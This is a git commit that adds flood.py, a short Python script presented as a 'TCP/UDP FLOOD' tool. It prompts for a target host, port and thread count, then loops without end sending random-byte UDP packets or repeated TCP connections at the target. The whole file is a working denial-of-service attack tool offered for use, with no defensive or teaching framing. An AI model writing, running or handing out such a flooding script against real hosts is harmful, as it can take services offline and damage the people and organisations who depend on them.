5f9aee4aeb03294b259558ed5471c9b186278b91
Leeon123 <leeon123ex@gmail.com>
2018-12-16 13:48:35 +0800

    Add files via upload

---
+++ flood.py
@@ -0,0 +1,48 @@
+#!/usr/bin/env python3
+#Code by LeeOn123
+import random
+import socket
+import threading
+
+print("#-- TCP/UDP FLOOD --#")
+print("[!] C0de By Lee0n123")
+ip = str(input(" Host/Ip:"))
+port = int(input(" Port:"))
+choice = str(input(" UDP(y/n):"))
+times = int(input(" Packets per one connection:"))
+threads = int(input(" Threads:"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Sent!!!")
+		except:
+			print("[!] Error")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
